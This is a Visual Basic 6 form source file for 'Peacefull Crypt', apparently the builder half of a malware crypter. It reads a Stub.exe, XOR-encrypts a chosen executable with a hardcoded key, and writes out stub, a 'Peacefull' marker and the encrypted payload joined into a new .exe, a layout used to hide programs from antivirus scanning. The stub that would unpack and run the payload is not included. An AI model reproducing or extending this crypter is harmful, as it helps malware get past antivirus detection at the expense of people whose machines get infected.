VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Begin VB.Form Form1 
   Caption         =   "..:: Peacefull Crypt ::.."
   ClientHeight    =   960
   ClientLeft      =   60
   ClientTop       =   375
   ClientWidth     =   4290
   LinkTopic       =   "Form1"
   ScaleHeight     =   960
   ScaleWidth      =   4290
   StartUpPosition =   3  'Windows Default
   Begin MSComDlg.CommonDialog CommonDialog1 
      Left            =   3720
      Top             =   600
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Crypt"
      Height          =   255
      Left            =   1440
      TabIndex        =   2
      Top             =   600
      Width           =   975
   End
   Begin VB.CommandButton Command1 
      Caption         =   "...."
      Height          =   255
      Left            =   3600
      TabIndex        =   1
      Top             =   240
      Width           =   615
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Left            =   120
      TabIndex        =   0
      Text            =   "Select file ...."
      Top             =   240
      Width           =   3375
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Command2_Click()

Dim Stub As String
Dim File As String

Open App.Path & "\Stub.exe" For Binary As #1
Stub = Space(LOF(1))
Get #1, , Stub
Close #1

CommonDialog1.FileName = vbNullString

With CommonDialog1
.DialogTitle = "Save file as..."
.Filter = "Executable (*.exe) |*.exe"
.ShowSave
End With

Open Text1.Text For Binary As #1

File = Space(LOF(1))
Get #1, , File
Close #1

File = Encrypt(File, "OiJkN")

Open CommonDialog1.FileName For Binary As #1

Put #1, , Stub & "Peacefull" & File
Close #1


MsgBox "Done", vbInformation

End Sub

Private Sub Command1_Click()

With CommonDialog1
.DialogTitle = "Select file to crypt !"
.Filter = "Executable (*.exe) |*.exe"
.ShowOpen
End With

If Not CommonDialog1.FileName = vbNullString Then
Text1.Text = CommonDialog1.FileName

End If
End Sub

Public Function Encrypt(sText As String, sKey As String) As String
Dim i, x, y As Integer, b() As Byte, k() As Byte

Encrypt = vbNullString
x = 0
b() = StrConv(sText, vbFromUnicode)
k() = StrConv(sKey, vbFromUnicode)
For i = 0 To Len(sText) - 1
    If x = Len(sKey) - 1 Then
        x = 0
    Else
        x = x + 1
    End If
   
    For y = 1 To 255
        b(i) = b(i) Xor k(x) Mod (y + 5)
    Next y
Next i
Encrypt = StrConv(b, vbUnicode)
End Function

